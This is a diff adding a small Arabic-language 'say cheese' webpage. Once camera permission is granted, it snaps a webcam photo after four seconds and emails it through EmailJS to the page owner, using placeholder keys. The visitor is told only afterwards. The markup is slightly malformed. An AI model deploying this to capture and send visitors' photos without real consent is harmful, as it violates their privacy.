@@ -1,0 +1,42 @@
+!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>📸 الكاميرا</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    body { text-align: center; margin-top: 40px; font-family: Arial; }
+    video { border: 2px solid #ccc; border-radius: 10px; }
+  </style>
+</head>
+<body>
+  <h2>📸 قول تشيز!</h2>
+  <video id="video" width="640" height="480" autoplay></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    emailjs.init("🔑 حط هون الـ Public Key");
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png');
+
+          emailjs.send("🆔 Service ID", "📩 Template ID", {
+            image: imageData
+          })
+          .then(() => {
+            alert("✅ انبعتت الصورة عالإيميل!");
+          }, (err) => {
+            alert("❌ صار في مشكلة: " + JSON.stringify(err));
+          });
+        }, 4000);
+      });
+  </script>
+.html
